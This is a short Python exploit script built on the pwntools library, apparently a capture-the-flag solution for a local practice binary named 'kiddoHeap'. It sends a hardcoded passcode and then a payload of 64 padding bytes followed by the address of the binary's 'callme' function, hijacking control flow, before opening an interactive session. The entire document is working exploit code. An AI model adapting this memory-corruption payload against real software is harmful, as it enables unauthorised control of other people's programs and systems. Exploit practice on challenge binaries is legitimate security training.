#!/usr/bin/env python3
from pwn import *
p = process("./kiddoHeap")
# gdb.attach(p,gdbscript='b *0x08049265')
elf = ELF("./kiddoHeap")
payload = b'a'*64 + p32(elf.sym.callme)
passcode = '53626584'
p.recvuntil("passcode!")
p.sendline(passcode)
print(p.recvline())
print(p.recvline())
p.sendline(payload)
p.interactive()